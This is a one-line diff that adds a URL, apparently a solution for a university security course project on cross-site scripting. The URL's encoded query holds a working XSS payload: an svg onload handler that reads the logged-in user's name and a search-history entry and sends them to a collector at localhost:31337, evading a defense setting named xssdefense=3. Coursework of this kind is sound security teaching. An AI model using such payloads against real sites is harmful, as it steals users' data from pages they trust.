@@ -1,0 +1,1 @@
+https://project2.ecen4133.org/search?xssdefense=3&q=%3Csvg%20onload%3D%22%28new%20Image%28%29%29.src%3D%60http%3A%2F%2Flocalhost%3A31337%2F%3Fretrieved_user%3D%60%2Bdocument.querySelector%28%60%23logged-in-user%60%29.innerText%2B%60%26last_search%3D%60%2Bdocument.querySelectorAll%28%60.history-item.list-group-item%60%29%5B1%5D.innerText%22%3E%0D%0A
